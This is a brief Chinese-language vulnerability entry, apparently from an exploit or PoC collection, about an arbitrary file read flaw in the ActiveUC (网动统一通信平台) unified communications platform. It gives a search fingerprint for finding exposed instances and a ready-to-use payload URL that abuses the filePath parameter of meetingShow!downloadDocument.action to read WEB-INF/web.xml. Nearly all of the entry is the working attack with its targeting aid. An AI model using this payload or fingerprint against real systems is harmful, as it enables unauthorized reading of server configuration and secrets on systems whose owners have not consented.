# 网动统一通信平台(ActiveUC)downloadDocument.action存在任意文件读取漏洞

网动统一通信平台(ActiveUC) ｜ 任意文件读取/写入 ｜ —
- **指纹**：`title="网动统一通信平台(Active UC)"`

**Payload**
```
[http://127.0.0.1/acenter/meetingShow!downloadDocument.action?filePath=WEB-INF/web.xml&filename=xxx](http://127.0.0.1/acenter/meetingShow!downloadDocument.action?filePath=WEB-INF/web.xml&filename=xxx)
```